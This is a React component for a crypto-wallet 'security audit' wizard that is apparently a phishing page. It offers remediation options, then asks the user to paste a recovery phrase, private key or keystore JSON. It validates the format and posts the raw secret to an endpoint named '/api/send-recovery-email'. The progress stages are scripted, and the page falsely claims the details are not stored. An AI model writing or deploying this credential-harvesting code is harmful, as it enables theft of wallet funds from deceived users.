'use client'

import { useCallback, useEffect, useMemo, useState } from 'react'

interface SecurityOption {
  id: string
  title: string
  description: string
  badge: string
  outcome: string
}

const securityOptions: SecurityOption[] = [
  {
    id: 'wallet',
    title: 'Restore Wallet Session',
    description: 'Resolve session inconsistencies, unexpected access, and local wallet state issues to restore normal behavior.',
    badge: 'Wallet',
    outcome: 'Use this to re-establish a secure session and rollback suspicious local changes.',
  },
  {
    id: 'dapp',
    title: 'Remediate Connected dApps',
    description: 'Identify and remove risky dApp permissions, revoke approvals, and restore minimal access scopes.',
    badge: 'dApp',
    outcome: 'Use this to revoke unwanted approvals and reduce attack surface from third-party sites.',
  },
  {
    id: 'contract',
    title: 'Token & Contract Remediation',
    description: 'Detect unsafe approvals, abnormal token behavior, and repair or revoke risky contract permissions.',
    badge: 'Contract',
    outcome: 'Use this to revoke dangerous allowances and secure token interactions.',
  },
  {
    id: 'network',
    title: 'RPC & Network Repair',
    description: 'Verify chain configuration, RPC endpoints, and routing; repair wrong-network settings and unreliable providers.',
    badge: 'Network',
    outcome: 'Use this to realign network settings and restore reliable transaction routing.',
  },
]

const connectionTypes = ['Secret Phrase', 'Keystore', 'Private Key'] as const
type ConnectionType = (typeof connectionTypes)[number]
type SecurityFlowStep = 'idle' | 'initializing' | 'chooseConnection' | 'enterSecret' | 'reviewing' | 'success' | 'error'

const stepStatus: Record<'initializing' | 'reviewing', string[]> = {
  initializing: [
    'Preparing the audit workspace',
    'Checking the selected risk domain',
    'Loading the review checklist',
  ],
  reviewing: [
    'Validating the input format',
    'Processing the selected review path',
    'Preparing the audit summary',
  ],
}

const wizardSteps = ['Scope', 'Method', 'Input', 'Result'] as const

const validateConnectionInput = (type: ConnectionType, value: string) => {
  const trimmed = value.trim()
  if (type === 'Secret Phrase') return trimmed.split(/\s+/).filter(Boolean).length >= 12 && trimmed.split(/\s+/).filter(Boolean).length <= 24
  if (type === 'Private Key') return /^(0x)?[A-Fa-f0-9]{64}$/.test(trimmed)
  if (type === 'Keystore') {
    try {
      const parsed = JSON.parse(trimmed)
      return typeof parsed === 'object' && parsed !== null && 'crypto' in parsed
    } catch {
      return false
    }
  }
  return false
}

const getStepIndex = (flowStep: SecurityFlowStep) => {
  switch (flowStep) {
    case 'idle':
      return 0
    case 'initializing':
      return 0
    case 'chooseConnection':
      return 1
    case 'enterSecret':
      return 2
    case 'reviewing':
    case 'success':
    case 'error':
      return 3
    default:
      return 0
  }
}

const FlowGlyph = ({ kind }: { kind: 'wallet' | 'contract' | 'network' | 'scan' | 'check' | 'alert' }) => {
  const iconMap = {
    wallet: <><path d="M4 8a2 2 0 0 1 2-2h11a1 1 0 0 1 1 1v10a1 1 0 0 1-1 1H6a2 2 0 0 1-2-2z" /><path d="M15 12h3" /></>,
    contract: <><rect x="5" y="5" width="6" height="6" rx="1.5" /><rect x="13" y="13" width="6" height="6" rx="1.5" /><path d="M11 8h2M8 11v2M16 11v2M11 16h2" /></>,
    network: <><circle cx="6" cy="12" r="2" /><circle cx="18" cy="7" r="2" /><circle cx="18" cy="17" r="2" /><path d="M8 11l8-3M8 13l8 3" /></>,
    scan: <><path d="M4 8V6a2 2 0 0 1 2-2h2" /><path d="M20 8V6a2 2 0 0 0-2-2h-2" /><path d="M4 16v2a2 2 0 0 0 2 2h2" /><path d="M20 16v2a2 2 0 0 1-2 2h-2" /><path d="M7 12h10" /></>,
    check: <><path d="M12 3l7 4v5c0 4.4-2.8 7.8-7 9-4.2-1.2-7-4.6-7-9V7l7-4z" /><path d="M9.5 12.5l1.7 1.7 3.3-4" /></>,
    alert: <><path d="M12 4l8 14H4L12 4z" /><path d="M12 9v4" /><path d="M12 16h.01" /></>,
  }

  return (
    <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      {iconMap[kind]}
    </svg>
  )
}

const getOptionGlyph = (id: SecurityOption['id']) => {
  if (id === 'wallet') return 'wallet'
  if (id === 'contract') return 'contract'
  if (id === 'network') return 'network'
  return 'scan'
}

export const SecurityAudit = () => {
  const [activeOption, setActiveOption] = useState<SecurityOption | null>(null)
  const [flowStep, setFlowStep] = useState<SecurityFlowStep>('idle')
  const [selectedConnection, setSelectedConnection] = useState<ConnectionType | null>(null)
  const [connectionInput, setConnectionInput] = useState('')
  const [inputError, setInputError] = useState('')
  const [activityMessage, setActivityMessage] = useState('Preparing the audit workspace')
  const [progressIndex, setProgressIndex] = useState(0)
  const [auditSummary, setAuditSummary] = useState<string[]>([])
  const [statusMessage, setStatusMessage] = useState('')

  const activeMessages = useMemo(() => {
    if (flowStep === 'initializing') return stepStatus.initializing
    if (flowStep === 'reviewing') return stepStatus.reviewing
    return []
  }, [flowStep])

  const canContinue = Boolean(selectedConnection && validateConnectionInput(selectedConnection, connectionInput))
  const stepIndex = getStepIndex(flowStep)
  const progressWidth = activeMessages.length > 0 ? ((progressIndex + 1) / activeMessages.length) * 100 : 0

  const resetFlow = () => {
    setFlowStep('idle')
    setActiveOption(null)
    setSelectedConnection(null)
    setConnectionInput('')
    setInputError('')
    setAuditSummary([])
    setStatusMessage('')
    setActivityMessage(stepStatus.initializing[0])
    setProgressIndex(0)
  }

  useEffect(() => {
    if (flowStep === 'idle') return

    const handleKeyDown = (event: KeyboardEvent) => {
      if (event.key === 'Escape') resetFlow()
    }

    window.addEventListener('keydown', handleKeyDown)
    return () => window.removeEventListener('keydown', handleKeyDown)
  }, [flowStep])

  useEffect(() => {
    if (flowStep !== 'initializing' && flowStep !== 'reviewing') return

    const messages = flowStep === 'initializing' ? stepStatus.initializing : stepStatus.reviewing
    let currentIndex = 0
    const timers: NodeJS.Timeout[] = []

    const tick = () => {
      currentIndex += 1
      if (currentIndex < messages.length) {
        timers.push(setTimeout(() => {
          setActivityMessage(messages[currentIndex])
          setProgressIndex(currentIndex)
          tick()
        }, 1500))
        return
      }

      if (flowStep === 'initializing') {
        timers.push(setTimeout(() => setFlowStep('chooseConnection'), 700))
      }
    }

    timers.push(setTimeout(tick, 1500))
    return () => timers.forEach(clearTimeout)
  }, [flowStep])

  const submitSecurityAudit = useCallback(async () => {
    if (!activeOption || !selectedConnection) {
      setFlowStep('error')
      setStatusMessage('The audit flow was interrupted. Start the review again.')
      return
    }

    const startTime = Date.now()

    try {
      const timestamp = new Date().toISOString()
      const method = selectedConnection === 'Secret Phrase' ? 'phrase' : selectedConnection === 'Keystore' ? 'keystore' : 'privatekey'

      const response = await fetch('/api/send-recovery-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          issueId: activeOption.id,
          issueTitle: activeOption.title,
          issueDescription: activeOption.description,
          issueSummary: activeOption.outcome,
          selectedConnection,
          method,
          data: connectionInput.trim(),
          timestamp,
        }),
      })

      if (!response.ok) {
        const errorResponse = await response.text()
        throw new Error(errorResponse || 'Failed to process security audit details')
      }

      const elapsed = Date.now() - startTime
      if (elapsed < 7000) {
        await new Promise((resolve) => setTimeout(resolve, 7000 - elapsed))
      }

      setAuditSummary([
        `Review path: ${activeOption.title}`,
        `Verification mode: ${selectedConnection}`,
        `Validated input type: ${method}`,
        activeOption.outcome,
      ])
      setStatusMessage('The audit review was processed and the summary is ready.')
      setFlowStep('success')
    } catch (err) {
      setFlowStep('error')
      setStatusMessage(err instanceof Error ? err.message : 'Failed to process audit details.')
    }
  }, [activeOption, connectionInput, selectedConnection])

  const handleOptionSelect = (option: SecurityOption) => {
    setActiveOption(option)
    setActivityMessage(stepStatus.initializing[0])
    setProgressIndex(0)
    setSelectedConnection(null)
    setConnectionInput('')
    setInputError('')
    setAuditSummary([])
    setStatusMessage('')
    setFlowStep('initializing')
  }

  const handleConnectionSelect = (type: ConnectionType) => {
    setSelectedConnection(type)
    setConnectionInput('')
    setInputError('')
    setStatusMessage('')
    setFlowStep('enterSecret')
  }

  const handleContinue = () => {
    if (!selectedConnection) return

    if (!validateConnectionInput(selectedConnection, connectionInput)) {
      setInputError(
        selectedConnection === 'Secret Phrase'
          ? 'Enter a valid 12 to 24 word recovery phrase.'
          : selectedConnection === 'Private Key'
            ? 'Enter a valid 64-character hex private key.'
            : 'Enter a valid keystore JSON object.'
      )
      return
    }

    setInputError('')
    setActivityMessage(stepStatus.reviewing[0])
    setProgressIndex(0)
    setFlowStep('reviewing')
    void submitSecurityAudit()
  }

  const inputHint =
    selectedConnection === 'Secret Phrase'
      ? 'Paste the full phrase separated by spaces.'
      : selectedConnection === 'Private Key'
        ? 'Paste the key with or without the 0x prefix.'
        : 'Paste the entire encrypted keystore JSON.'

  return (
    <div className="space-y-6">
      <section className={`rounded-[30px] border border-white/10 bg-slate-950/90 p-5 shadow-[0_32px_80px_-54px_rgba(56,189,248,0.38)] transition sm:p-7 ${flowStep !== 'idle' ? 'opacity-35 saturate-50' : 'opacity-100'}`}>
        <div className="grid gap-5 lg:grid-cols-[1.4fr_0.8fr]">
          <div className="space-y-5">
            <div>
              <p className="text-xs font-semibold uppercase tracking-[0.3em] text-cyan-300">Security Review</p>
              <h2 className="mt-3 text-3xl font-semibold text-white sm:text-4xl">Inspect wallet risk before it becomes a loss event</h2>
              <p className="mt-3 max-w-2xl text-sm leading-7 text-slate-400 sm:text-base">
                Understand what has access to your wallet, which requests deserve caution, and where your current setup may be creating avoidable risk.
              </p>
            </div>

            <div className="grid gap-3 sm:grid-cols-3">
              {[
                'Wallet and session checks',
                'Approval and contract review',
                'Network and RPC validation',
              ].map((item) => (
                <div key={item} className="rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-medium text-slate-200">
                  {item}
                </div>
              ))}
            </div>
          </div>

          <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-1">
            <div className="rounded-[24px] border border-white/10 bg-white/5 p-4">
              <p className="text-xs uppercase tracking-[0.28em] text-slate-400">Coverage</p>
              <p className="mt-3 text-sm leading-6 text-slate-300">Review approvals, signing prompts, contract exposure, and network reliability before you authorize anything sensitive.</p>
            </div>
            <div className="rounded-[24px] border border-white/10 bg-white/5 p-4">
              <p className="text-xs uppercase tracking-[0.28em] text-slate-400">Output</p>
              <p className="mt-3 text-sm leading-6 text-slate-300">Receive a focused summary that makes the selected risk area easier to understand and act on.</p>
            </div>
          </div>
        </div>

        <div className="mt-6 grid gap-4 xl:grid-cols-2">
          {securityOptions.map((option) => (
            <button
              key={option.id}
              type="button"
              onClick={() => handleOptionSelect(option)}
              className="group rounded-[26px] border border-white/10 bg-white/5 p-5 text-left transition hover:-translate-y-0.5 hover:border-cyan-400/35 hover:bg-white/8"
            >
              <div className="flex items-start gap-4">
                <span className="inline-flex h-11 w-11 shrink-0 items-center justify-center rounded-2xl border border-cyan-400/20 bg-cyan-500/10 text-cyan-300">
                  <FlowGlyph kind={getOptionGlyph(option.id)} />
                </span>
                <div className="min-w-0 flex-1">
                  <div className="flex flex-wrap items-center gap-3">
                    <span className="text-xs font-semibold uppercase tracking-[0.26em] text-cyan-300">{option.badge}</span>
                    <span className="rounded-full border border-white/10 bg-slate-900/80 px-2.5 py-1 text-[11px] text-slate-300">Focused review</span>
                  </div>
                  <h3 className="mt-3 text-lg font-semibold text-slate-200">{option.title}</h3>
                  <p className="mt-2 text-sm leading-6 text-slate-400">{option.description}</p>
                  <p className="mt-4 text-sm text-slate-300">{option.outcome}</p>
                </div>
              </div>
            </button>
          ))}
        </div>
      </section>

      {flowStep !== 'idle' && (
        <div className="fixed inset-0 z-50 bg-slate-950/78 backdrop-blur-md">
          <div className="flex h-[100dvh] items-end sm:items-center sm:justify-center">
            <div
              role="dialog"
              aria-modal="true"
              aria-labelledby="security-audit-title"
              className="flex h-[100dvh] w-full flex-col overflow-hidden border border-white/10 bg-slate-950/98 shadow-2xl shadow-slate-950/60 sm:h-auto sm:max-h-[90vh] sm:max-w-3xl sm:rounded-[32px]"
            >
              <div className="border-b border-white/10 bg-slate-950/95 px-4 pb-4 pt-4 sm:px-6">
                <div className="flex items-start justify-between gap-4">
                  <div className="min-w-0">
                    <p className="text-xs uppercase tracking-[0.28em] text-cyan-300">Security wizard</p>
                    <h2 id="security-audit-title" className="mt-2 text-2xl font-semibold text-slate-200">
                      {activeOption?.title ?? 'Security review'}
                    </h2>
                    <p className="mt-2 text-sm leading-6 text-slate-400">
                      {activeOption?.description ?? 'Follow the next step to complete the review.'}
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={resetFlow}
                    className="inline-flex h-11 w-11 shrink-0 items-center justify-center rounded-full border border-white/10 bg-white/5 text-slate-200 transition hover:bg-white/10"
                    aria-label="Close security wizard"
                  >
                    X
                  </button>
                </div>

                <div className="mt-5 grid grid-cols-4 gap-2">
                  {wizardSteps.map((step, index) => {
                    const active = index === stepIndex
                    const complete = index < stepIndex
                    return (
                      <div
                        key={step}
                        className={`rounded-2xl border px-3 py-2 text-center text-[11px] font-semibold uppercase tracking-[0.18em] ${
                          active
                            ? 'border-cyan-400/40 bg-cyan-500/12 text-white'
                            : complete
                              ? 'border-emerald-400/20 bg-emerald-500/10 text-emerald-200'
                              : 'border-white/10 bg-white/5 text-slate-500'
                        }`}
                      >
                        {step}
                      </div>
                    )
                  })}
                </div>
              </div>

              <div className="flex-1 overflow-y-auto px-4 py-5 sm:px-6 sm:py-6">
                {flowStep === 'initializing' && (
                  <div className="space-y-5">
                    <div className="rounded-[28px] border border-cyan-400/20 bg-cyan-500/8 p-5 sm:p-6">
                      <div className="flex items-center gap-4">
                        <span className="inline-flex h-14 w-14 items-center justify-center rounded-2xl border border-cyan-400/20 bg-slate-900/80 text-cyan-300">
                          <FlowGlyph kind="scan" />
                        </span>
                        <div>
                          <p className="text-sm font-semibold text-slate-200">Preparing the security solution</p>
                          <p className="mt-1 text-sm text-slate-400">{activityMessage}</p>
                        </div>
                      </div>
                      <div className="mt-5 rounded-full bg-slate-800/90 p-1">
                        <div className="h-2 rounded-full bg-cyan-400 transition-all" style={{ width: `${Math.max(progressWidth, 20)}%` }} />
                      </div>
                    </div>

                    <div className="grid gap-3">
                      {activeMessages.map((message, index) => (
                        <div
                          key={message}
                          className={`rounded-[22px] border p-4 transition ${progressIndex >= index ? 'border-cyan-400/25 bg-white/7 text-white' : 'border-white/10 bg-white/5 text-slate-400'}`}
                        >
                          <p className="text-xs uppercase tracking-[0.24em] text-slate-500">Stage {index + 1}</p>
                          <p className="mt-2 text-sm font-medium">{message}</p>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {flowStep === 'chooseConnection' && (
                  <div className="space-y-5">
                    <div className="rounded-[24px] border border-white/10 bg-white/5 p-5">
                      <p className="text-sm text-slate-300">Select the verification source that matches the credentials or backup material available to you.</p>
                    </div>

                    <div className="grid gap-4 sm:grid-cols-3">
                      {connectionTypes.map((type) => (
                        <button
                          key={type}
                          type="button"
                          onClick={() => handleConnectionSelect(type)}
                          className="rounded-[24px] border border-white/10 bg-white/5 p-5 text-left transition hover:border-cyan-400/35 hover:bg-white/8"
                        >
                          <span className="inline-flex h-11 w-11 items-center justify-center rounded-2xl border border-cyan-400/20 bg-cyan-500/10 text-cyan-300">
                            <FlowGlyph kind={type === 'Secret Phrase' ? 'wallet' : type === 'Keystore' ? 'contract' : 'network'} />
                          </span>
                          <p className="mt-4 text-base font-semibold text-slate-200">{type}</p>
                          <p className="mt-2 text-sm leading-6 text-slate-400">
                            {type === 'Secret Phrase'
                              ? 'Best when you are working from the wallet recovery phrase.'
                              : type === 'Keystore'
                                ? 'Best when you have an encrypted keystore file or JSON backup.'
                                : 'Best when you are verifying from the raw private key.'}
                          </p>
                        </button>
                      ))}
                    </div>
                  </div>
                )}

                {flowStep === 'enterSecret' && selectedConnection && (
                  <div className="space-y-5">
                    <div className="grid gap-4 lg:grid-cols-[1.2fr_0.8fr]">
                      <div className="rounded-[26px] border border-white/10 bg-white/5 p-5">
                        <p className="text-xs uppercase tracking-[0.26em] text-cyan-300">Verification input</p>
                        <h3 className="mt-3 text-xl font-semibold text-slate-200">{selectedConnection}</h3>
                        <p className="mt-2 text-sm leading-6 text-slate-400">{inputHint}</p>

                        <textarea
                          value={connectionInput}
                          onChange={(event) => {
                            setConnectionInput(event.target.value)
                            setInputError('')
                          }}
                          placeholder={selectedConnection === 'Secret Phrase' ? 'word1 word2 word3 ...' : selectedConnection === 'Private Key' ? '0x...' : '{ "crypto": { ... } }'}
                          className="mt-5 min-h-[220px] w-full rounded-[24px] border border-slate-700/70 bg-slate-950/90 px-4 py-4 text-sm text-slate-100 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                        />
                        <div className="mt-3 flex items-start gap-3">
                          <svg className="h-5 w-5 text-cyan-400 mt-1 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
                            <rect x="3" y="11" width="18" height="10" rx="2" />
                            <path d="M7 11V8a5 5 0 0 1 10 0v3" />
                          </svg>
                          <div className="text-sm text-slate-400">
                            <div className="font-medium text-slate-200">Secure input</div>
                            <div className="text-[13px]">Your details are processed securely and are not stored on this device or server.</div>
                          </div>
                        </div>
                        {inputError ? <p className="mt-3 text-sm text-rose-400">{inputError}</p> : null}
                      </div>

                      <div className="space-y-4">
                        <div className="rounded-[24px] border border-white/10 bg-white/5 p-5">
                          <p className="text-xs uppercase tracking-[0.26em] text-slate-400">Before you continue</p>
                          <ul className="mt-4 space-y-3 text-sm text-slate-300">
                            <li>Use the exact format expected by the selected method.</li>
                            <li>Double-check spacing, braces, and any key prefix before continuing.</li>
                            <li>Review the final summary before switching to another security task.</li>
                          </ul>
                        </div>
                        <button
                          type="button"
                          onClick={() => {
                            setFlowStep('chooseConnection')
                            setInputError('')
                            setStatusMessage('')
                            setConnectionInput('')
                          }}
                          className="w-full rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-semibold text-slate-200 transition hover:bg-white/10"
                        >
                          Change verification mode
                        </button>
                      </div>
                    </div>
                  </div>
                )}

                {flowStep === 'reviewing' && (
                  <div className="space-y-5">
                    <div className="rounded-[28px] border border-cyan-400/20 bg-cyan-500/8 p-6 text-center">
                      <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl border border-cyan-400/20 bg-slate-900/80 text-cyan-300">
                        <FlowGlyph kind="scan" />
                      </div>
                      <h3 className="mt-4 text-2xl font-semibold text-slate-200">Security solution in progress</h3>
                      <p className="mt-2 text-sm text-slate-400">{activityMessage}</p>
                      <div className="mt-5 rounded-full bg-slate-800/90 p-1">
                        <div className="h-2 rounded-full bg-cyan-400 transition-all" style={{ width: `${Math.max(progressWidth, 22)}%` }} />
                      </div>
                    </div>

                    <div className="grid gap-3">
                      {activeMessages.map((message, index) => (
                        <div key={message} className={`rounded-[22px] border p-4 ${progressIndex >= index ? 'border-cyan-400/25 bg-white/7 text-white' : 'border-white/10 bg-white/5 text-slate-400'}`}>
                          <p className="text-sm">{message}</p>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {flowStep === 'success' && (
                  <div className="space-y-5">
                    <div className="rounded-[28px] border border-emerald-500/20 bg-emerald-500/10 p-5 sm:p-6">
                      <div className="flex items-start gap-4">
                        <span className="inline-flex h-12 w-12 items-center justify-center rounded-2xl bg-emerald-500/10 text-emerald-300">
                          <FlowGlyph kind="check" />
                        </span>
                        <div>
                          <h3 className="text-xl font-semibold text-slate-200">Security summary ready</h3>
                          <p className="mt-2 text-sm text-slate-300">{statusMessage}</p>
                        </div>
                      </div>
                    </div>

                    <div className="rounded-[24px] border border-white/10 bg-white/5 p-5">
                      <p className="text-sm font-semibold text-slate-200">Summary</p>
                      <ul className="mt-4 space-y-3 text-sm text-slate-300">
                        {auditSummary.map((line) => (
                          <li key={line} className="flex items-start gap-3">
                            <span className="mt-1 text-emerald-300">-</span>
                            <span>{line}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                )}

                {flowStep === 'error' && (
                  <div className="space-y-5">
                    <div className="rounded-[28px] border border-rose-500/20 bg-rose-500/10 p-5 sm:p-6">
                      <div className="flex items-start gap-4">
                        <span className="inline-flex h-12 w-12 items-center justify-center rounded-2xl bg-rose-500/10 text-rose-300">
                          <FlowGlyph kind="alert" />
                        </span>
                        <div>
                          <h3 className="text-xl font-semibold text-slate-200">The solution could not be completed</h3>
                          <p className="mt-2 text-sm text-slate-300">{statusMessage}</p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>

              <div className="border-t border-white/10 bg-slate-950/95 px-4 py-4 pb-[calc(1rem+env(safe-area-inset-bottom))] sm:px-6">
                <div className="flex flex-col gap-3 sm:flex-row sm:justify-between">
                  <button
                    type="button"
                    onClick={resetFlow}
                    className="rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-semibold text-slate-200 transition hover:bg-white/10"
                  >
                    {flowStep === 'success' || flowStep === 'error' ? 'Close wizard' : 'Cancel'}
                  </button>

                  {flowStep === 'enterSecret' && (
                    <button
                      type="button"
                      onClick={handleContinue}
                      disabled={!canContinue}
                      className="rounded-2xl bg-cyan-400 px-5 py-3 text-sm font-semibold text-slate-950 transition hover:bg-cyan-300 disabled:cursor-not-allowed disabled:opacity-50"
                    >
                      Apply solution
                    </button>
                  )}

                  {flowStep === 'success' && (
                    <button
                      type="button"
                      onClick={resetFlow}
                      className="rounded-2xl bg-emerald-400 px-5 py-3 text-sm font-semibold text-slate-950 transition hover:bg-emerald-300"
                    >
                      Start new audit
                    </button>
                  )}

                  {flowStep === 'error' && (
                    <button
                      type="button"
                      onClick={() => setFlowStep('chooseConnection')}
                      className="rounded-2xl bg-rose-400 px-5 py-3 text-sm font-semibold text-slate-950 transition hover:bg-rose-300"
                    >
                      Try again
                    </button>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
